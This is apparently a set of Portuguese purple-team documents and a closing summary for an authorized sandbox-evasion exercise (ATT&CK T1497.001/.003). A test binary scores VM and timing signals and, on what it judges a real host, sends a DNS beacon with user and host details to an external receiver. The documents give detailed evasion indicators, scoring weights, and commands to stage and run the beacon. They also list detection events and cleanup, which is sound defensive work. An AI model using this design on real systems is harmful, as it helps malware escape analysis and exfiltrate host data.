PT-2026-003 — Virtualization/Sandbox Evasion (T1497.001 + T1497.003)
README.md
Lab controlado de evasao de sandbox cobrindo perfil de ambiente (System Checks) e checagem temporal (Time Based Evasion), com a decisao de executar um estagio seguinte (marker + beacon DNS) condicionada ao resultado. Tudo canario, sem privilegio administrativo e com cleanup documentado.

Cenarios
#	Cenario	Comando-chave	TTPs
B1	Perfil do ambiente (coleta sem ramificar)	pt-sandbox-evasion.exe --profile	T1497.001, T1497.003 (recon)
B2	Decisao condicionada -> marker + beacon	pt-sandbox-evasion.exe --beacon --cid pt1497	T1497.001, T1497.003, T1071.004
B3	Controle (ignora checks) — prova do gating	pt-sandbox-evasion.exe --force --beacon --cid pt1497	T1497.001, T1497.003, T1071.004
TTPs cobertos
ID	Tecnica	Superficie
T1497.001	Virtualization/Sandbox Evasion: System Checks	primaria
T1497.003	Virtualization/Sandbox Evasion: Time Based Evasion	primaria
T1497	Virtualization/Sandbox Evasion (tecnica pai)	agregacao (sem execucao extra)
T1071.004	Application Layer Protocol: DNS	estagio seguinte (beacon)
T1497.002 (User Activity Based Evasion) fora de escopo. Cobertura real: 2 sub-tecnicas (001 + 003).

Artefatos
Arquivo	Papel
dist/pt-sandbox-evasion.exe	perfil do ambiente + time check + decisao condicionada + marker/beacon DNS
src/pt_sandbox.cpp	fonte (unico binario, llvm-mingw ucrt, deterministico)
build.ps1	reproducao do build
Beacon DNS (base64url, heartbeat hb<cid> + chunks pt<cid>.<seq>.<b64chunk>) reusa o receiver c2ns.b3j0ta.net (64.227.29.179:53) — mesmo protocolo de t1543-003.

Convencao
Marker: C:\Users\Public\pt-sandbox-fired.txt.
Profile: C:\Users\Public\pt-sandbox-profile.txt.
T0 UTC registrado antes de cada acao.
Threshold de decisao: score >= 4 => NOT-ELIGIBLE (suprime estagio seguinte).
Cleanup obrigatorio (staging + marker + profile).
Nota operacional
Executar somente em VM/endpoint autorizado. Nenhum passo exige elevacao (so leitura de propriedades: CPUID, SMBIOS, RAM/cores, MAC, registry, SCM, processos, relogios). Falso positivo conhecido: Win11 corporativo com VBS expoe hypervisor bit + Microsoft Hv em bare-metal (peso +1, nao dispara threshold). Detalhes: DESCRICAO-ARTEFATOS.md, DOCUMENTACAO-EXECUCAO.md, runbook-pt-t1497.md.

DESCRICAO-ARTEFATOS.md
Pasta t1497/. Um binario canario + script de build. Tudo idempotente e sem impacto produtivo (somente leitura de propriedades + marker + beacon DNS).

1. dist/pt-sandbox-evasion.exe — perfil de ambiente + decisao condicionada
Binario x64, llvm-mingw (ucrt), console (--profile observavel), deterministico (--no-insert-timestamp), sem privilegio administrativo.

Cobertura: a tecnica T1497 tem 3 sub-tecnicas; este exercicio cobre 2 (T1497.001 System Checks e T1497.003 Time Based Evasion). T1497.002 (User Activity Based) fica fora de escopo. A tecnica pai agrega cobertura sem execucao adicional.

Comportamento (um unico binario):

T1497.001 — System Checks (score de indicadores independentes):
CPUID leaf 0 (vendor) + hypervisor-present bit (leaf 1 ECX bit 31) + leaf 0x40000000 (vendor do hypervisor).
SMBIOS (GetSystemFirmwareTable 'RSMB') — scan por fabricante/string de VM.
Recursos: RAM total (GlobalMemoryStatusEx) e cores (GetActiveProcessorCount).
MAC (GetAdaptersInfo) — OUI virtual (VMware 00:0C:29/00:50:56, VirtualBox 08:00:27, Hyper-V 00:15:5D, Xen 00:16:3E, QEMU/KVM 52:54:00, ...).
Devices (CreateFileA): \\.\VMCIDev\VMX, \\.\HGFS, \\.\VBoxMiniRdrDN, \\.\VBoxGuest, \\.\pipe\vmware-control.
Registry (RegOpenKeyExA): VMware Tools, VirtualBox GA, Hyper-V Guest, vmbus.
Servicos (EnumServicesStatusExA): VMTools, VBoxService, vmbus, hvsiexec, ...
Processos (Toolhelp32): vmtoolsd.exe, VBoxTray.exe, VBoxService.exe, ...
T1497.003 — Time Based Evasion:
Duas referencias temporais independentes (QueryPerformanceCounter vs GetTickCount64/GetSystemTimeAsFileTime); mede duracao observada de Sleep(<ms>) e compara com a esperada (aceleracao = sandbox fast-forward).
Uptime via GetTickCount64 (boot recente/snapshot = sinal).
Decisao condicionada: soma os sinais em score. Se score >= 4 (threshold) → NOT-ELIGIBLE → suprime o estagio seguinte. Caso contrario → ELIGIBLE → executa marker + beacon.
Estagio seguinte (acao real do exercicio, 100% canario):

Marker C:\Users\Public\pt-sandbox-fired.txt (append) com user|domain|host|pid|ppid|session.
Beacon DNS base64url para c2ns.b3j0ta.net (64.227.29.179:53): heartbeat hb<cid> + chunks pt<cid>.<seq>.<b64chunk> (b64chunk <= 56 chars). Reuso do protocolo/receiver de t1543-003.
Argumentos:

Arg	Efeito	Default
--profile	coleta + imprime sinais + grava profile, sai (sem acao)	—
--beacon	acao = marker + beacon DNS (so se elegivel)	desligado
--force	controle: ignora checks, acao sempre executa	—
--cid <id>	id do implante (<=12 chars)	pt1497
--marker <path>	caminho do marker	C:\Users\Public\pt-sandbox-fired.txt
--sleep <ms>	espera do time-check	3000
SHA-256: 913117F609A3232C0E1857BB0E0B61CD847F7C70D534C5D58633ED2810E6EB5F

2. build.ps1 — reproducao
powershell -ExecutionPolicy Bypass -File build.ps1
Toolchain: tools/malware/runtimes/llvm-mingw/llvm-mingw-20260826-ucrt-x86_64. Links: ws2_32, advapi32, iphlpapi, kernel32.

3. Limitacoes / falsos positivos (relevante p/ estacao Win11 corporativa)
Hyper-V/VBS: maquina bare-metal com Virtualization-Based Security (comum em Win11 corporativo) tambem seta o hypervisor-present bit e expoe Microsoft Hv. Por isso esse sinal vale apenas +1 (ambiguo) — nao dispara o threshold sozinho. O threshold >= 4 evita falso negativo de evasao.
vmbus registry/servico pode existir em host Hyper-V (nao so guest).
A prova do TTP e o diferencial entre os modos: em estacao real o modo condicional executa o estagio seguinte; em VM/analise ele suprime; --force executa sempre.
4. Cadeia de deteccao (CrowdStrike-first)
Acao	event_simpleName Falcon	OS / Sysmon
execucao do binario	ProcessRollup2 (FileName=pt-sandbox-evasion.exe)	Sysmon 1 / Security 4688
profile escrito	NewExecutableWritten / file write	Sysmon 11
marker escrito	file write (C:\Users\Public\pt-sandbox-fired.txt)	Sysmon 11
beacon DNS (so se elegivel)	DnsRequest (hb<cid> / pt<cid>.<seq>.<b64> c2ns)	Sysmon 22
Nota ofensiva: as proprias consultas (CPUID, SMBIOS, SCM, registry) sao read-only e podem ser invisiveis na telemetria base — o evento detectavel e o processo em si + o trafego DNS condicionado.

DOCUMENTACAO-EXECUCAO.md
Regra de privilegio: todo o exercicio e [SEM ADMIN] — apenas leitura de propriedades do sistema. Nenhum passo exige elevacao UAC.

T0 UTC antes de cada acao:

Get-Date -Format o | Tee-Object C:\Users\Public\pt-t1497-t0.txt
Fase 0 — Baseline da estacao (documenta elegibilidade) [SEM ADMIN]
Get-CimInstance Win32_ComputerSystem | Select Manufacturer,Model,TotalPhysicalMemory
Get-CimInstance Win32_BIOS | Select Manufacturer,SMBIOSBIOSVersion,SerialNumber
Get-CimInstance Win32_Processor | Select Name,Manufacturer,NumberOfCores,NumberOfLogicalProcessors
Get-CimInstance Win32_ComputerSystemProduct | Select Vendor,Name,Version
Get-NetAdapter | Select Name,InterfaceDescription,MacAddress,Status
(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime   # uptime
Get-Process | ? {$_.Name -match 'vmtools|VBox|vmware|xen|prl_|sandbox|procmon|frida|x64dbg'} | Select Name,Id
Get-Service | ? {$_.Name -match 'vm|VBox|xen|vmtools|vmbus'} | Select Name,Status
Fase 1 — Implante [SEM ADMIN]
$s="$env:PUBLIC\pt-staging"
New-Item -ItemType Directory -Force -Path $s | Out-Null
Copy-Item .\dist\pt-sandbox-evasion.exe $s -Force
Get-FileHash "$s\pt-sandbox-evasion.exe" -Algorithm SHA256
Fase 2 — Execucao (3 modos) [SEM ADMIN]
# A) PROFILE — coleta todos os sinais e imprime, SEM ramificar
& "$env:PUBLIC\pt-staging\pt-sandbox-evasion.exe" --profile --cid pt1497

# B) CONDICIONAL — so executa marker+beacon se ELEGIVEL (estacao real)
& "$env:PUBLIC\pt-staging\pt-sandbox-evasion.exe" --beacon --cid pt1497

# C) CONTROLE (--force) — ignora checks, sempre executa marker+beacon
& "$env:PUBLIC\pt-staging\pt-sandbox-evasion.exe" --force --beacon --cid pt1497
Resultado esperado em estacao corporativa real: score < 4 → modo B executa o estagio seguinte. Em VM de analise, score >= 4 → modo B suprime; modo C executa mesmo assim — o diferencial B vs C prova a evasao.

Fase 3 — Evidencia ofensiva [SEM ADMIN]
Get-Content C:\Users\Public\pt-sandbox-fired.txt          # marker (so B/C elegivel)
Get-Content C:\Users\Public\pt-sandbox-profile.txt -Tail 40  # sinais + decisao
No receiver c2ns.b3j0ta.net, confirmar heartbeat hbpt1497 + chunks ptpt1497.<seq>.<b64chunk> somente quando o modo B/C executou o beacon.

Fase 4 — Telemetria defensiva (CrowdStrike-first)
Sinal	Evento Falcon	OS / Sysmon
processo	ProcessRollup2 (pt-sandbox-evasion.exe)	Sysmon 1 / Security 4688
profile/marker em disco	file write	Sysmon 11
beacon (so se elegivel)	DnsRequest (c2ns.b3j0ta.net)	Sysmon 22
Registrar TTD/TTI/TTC por modo, conforme modelo-relatorio-purple-team.md.

Rollback / higiene (obrigatorio)
Remove-Item "$env:PUBLIC\pt-staging" -Recurse -Force -EA SilentlyContinue
Remove-Item C:\Users\Public\pt-sandbox-fired.txt, C:\Users\Public\pt-sandbox-profile.txt, C:\Users\Public\pt-t1497-t0.txt -Force -EA SilentlyContinue
Nenhuma persistencia residual; nenhum dado real exfiltrado (tudo canario).

runbook-pt-t1497.md
Engagement: PT-2026-003 · Escopo: perfil de ambiente + checagem temporal condicionando um estagio seguinte (marker + beacon DNS). Autorizacao: NDA + exercicio Purple Team.

Mapeamento ATT&CK
ID	Tecnica	Superficie
T1497.001	Virtualization/Sandbox Evasion: System Checks	primaria
T1497.003	Virtualization/Sandbox Evasion: Time Based Evasion	primaria
T1497	Virtualization/Sandbox Evasion (tecnica pai)	agregacao (sem execucao extra)
T1071.004	Application Layer Protocol: DNS	estagio seguinte (beacon)
T1497.002 fora de escopo. Cobertura real: 2 sub-tecnicas (001 + 003).

Pre-condicoes
Estacao corporativa Windows 11 com agente Falcon + ingestao no console.
Caracteristicas da estacao documentadas (Fase 0) para interpretar a decisao.
dist/pt-sandbox-evasion.exe copiado para staging (Fase 1) — sem admin.
Receiver DNS c2ns.b3j0ta.net (64.227.29.179) operacional.
Resumo de privilegio
Modo	Admin?	Descricao
--profile	Nao	coleta + imprime sinais, sem acao
--beacon (condicional)	Nao	marker + beacon apenas se elegivel
--force --beacon (controle)	Nao	marker + beacon sempre
Nenhum modo exige elevacao; todas as consultas sao read-only.

Logica de decisao (threshold)
Sinais T1497.001 + T1497.003 somam score.
score >= 4 → NOT-ELIGIBLE (VM/sandbox) → estagio seguinte suprimido.
score < 4 → ELIGIBLE (estacao real) → estagio seguinte executa.
--force ignora o score (controle para provar que o gating e real).
Sinais implementados
Categoria	Sinal	Peso
CPUID	hypervisor-present bit + vendor VMware/VBox/KVM/Xen	+4
CPUID	Microsoft Hv (Hyper-V/VBS — ambiguo)	+1
SMBIOS	string de fabricante de VM	+3
Recursos	RAM < 2GB / cores <= 2	+1 cada
MAC	OUI virtual (VMware/VBox/Hyper-V/Xen/QEMU)	+3
Device	\\.\VMCIDev\VMX, \\.\HGFS, \\.\VBoxMiniRdrDN, ...	+3 cada
Registry	VMware Tools / VBox GA / Hyper-V Guest / vmbus	+2 cada
Servicos	VMTools, VBoxService, vmbus, hvsiexec, ...	+2 cada
Processos	vmtoolsd.exe, VBoxTray.exe, xenservice.exe, ...	+2 cada
T1497.003	Sleep observado << esperado (aceleracao)	+4
T1497.003	uptime < 60s	+1
Deteccao esperada (CrowdStrike-first)
Sinal	Evento Falcon	Nota
execucao	ProcessRollup2 (pt-sandbox-evasion.exe)	todos os modos
profile/marker	file write	--profile / elegivel
beacon (condicional)	DnsRequest (c2ns.b3j0ta.net)	so B/C elegivel
Cross-ref OS: Security 4688, Sysmon 1 (proc) / 11 (file) / 22 (DNS).

Validacao
Marker pt-sandbox-fired.txt presente somente em modo elegivel/forcado (prova do gating).
--profile imprime sinais + score + decisao; profile persistido em pt-sandbox-profile.txt.
Eventos no console Falcon (prova defensiva) + hash SHA-256 do binario.
Rollback / higiene
Ver DOCUMENTACAO-EXECUCAO.md — cleanup global.
Nenhuma persistencia; nenhum dado real exfiltrado (tudo canario).
Riscos / observacoes
Falso positivo Hyper-V/VBS: Win11 corporativo com VBS pode setar hypervisor bit e expor Microsoft Hv em bare-metal. Peso reduzido (+1) e threshold >= 4 mitigam falso NOT-ELIGIBLE.
Executar somente em estacao autorizada; smoke test local ja validado (modo --profile e --force sem beacon, sem egresso).
Arquivos em projects/PT-2026-003/t1497/: README.md, DESCRICAO-ARTEFATOS.md, DOCUMENTACAO-EXECUCAO.md, runbook-pt-t1497.md, build.ps1, src/pt_sandbox.cpp, dist/pt-sandbox-evasion.exe.

cole aqui uma versão mais resumido explicando o artefato, modus operandi, ttps, etc
T1497 — Virtualization/Sandbox Evasion (resumo)
Artefato: pt-sandbox-evasion.exe (x64, llvm-mingw ucrt, determinístico). SHA-256 913117F609A3232C0E1857BB0E0B61CD847F7C70D534C5D58633ED2810E6EB5F. Sem privilégio administrativo.

TTPs cobertos (2): T1497.001 (System Checks) + T1497.003 (Time Based Evasion). Parent T1497 agrega; T1071.004 (DNS) no estágio seguinte. T1497.002 fora de escopo.

O que faz (modus operandi):

Perfila o ambiente (T1497.001): CPUID (hypervisor vendor), SMBIOS, RAM/cores, MAC (OUI de VM), devices (\\.\VMCIDev\VMX…), registry, serviços e processos de VM.
Mede tempo (T1497.003): QueryPerformanceCounter vs GetTickCount64; compara duração observada de um Sleep com a esperada; usa uptime como sinal.
Soma tudo em score. Se score >= 4 → NOT-ELIGIBLE → suprime o estágio seguinte. Se < 4 → ELIGIBLE → executa marker pt-sandbox-fired.txt + beacon DNS para c2ns.b3j0ta.net (hb<cid> + chunks base64url).
Modos de execução (3):

Modo	Comando	Ação
Perfil	--profile	coleta + imprime sinais, sem ramificar
Condicional	--beacon --cid pt1497	marker+beacon só se elegível
Controle	--force --beacon --cid pt1497	ignora checks, sempre executa (prova o gating)
Detecção (CrowdStrike-first): ProcessRollup2 (binário) · DnsRequest (só se elegível) · file write. Cross-ref Sysmon 1/11/22, Security 4688.

Nota: falso positivo conhecido — Win11 com VBS expõe Microsoft Hv em bare-metal (peso +1, não dispara threshold sozinho). O gating é provado pelo diferencial entre modo condicional (suprime em VM) e --force (sempre executa).
